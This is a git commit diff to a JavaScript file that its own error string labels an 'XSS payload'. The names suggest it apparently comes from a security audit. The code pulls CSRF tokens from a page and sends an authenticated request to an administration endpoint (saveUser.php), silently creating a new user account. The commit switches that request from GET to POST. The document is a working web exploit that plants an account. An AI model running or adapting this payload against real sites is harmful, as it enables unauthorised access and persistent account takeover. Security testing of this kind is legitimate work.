0d5edbf7cf2a7fa26df34fb462250e446d23dddb
Paul-Adrien Cha <78745732+HeadjuiceOne@users.noreply.github.com>
2025-07-17 10:46:34 +0200

    Update 31db1230-2599-4417-92a4-bea9339278d8.js

--- 31db1230-2599-4417-92a4-bea9339278d8.js
+++ 31db1230-2599-4417-92a4-bea9339278d8.js
@@ -5,8 +5,22 @@
     const matches = [...t.matchAll(/token=([a-f0-9]{32})/g)];
     if (matches.length > 12) {
       const token = matches[12][1];
-      const url = '/administration/saveUser.php?IdUser=0&LoginUser=Headmind10&NomUser=Auditeur10&PrenomUser=Headmind&MailUser=auditeur10@headmind.com&token=' + token;
-      await fetch(url, { credentials: 'include' });
+      const data = new URLSearchParams({
+        IdUser: '0',
+        LoginUser: 'Headmind10',
+        NomUser: 'Auditeur10',
+        PrenomUser: 'Headmind',
+        MailUser: 'auditeur10@headmind.com',
+        token: token
+      }).toString();
+      await fetch('/administration/saveUser.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        credentials: 'include',
+        body: data
+      });
     }
   } catch (e) {
     console.error('XSS payload error:', e);
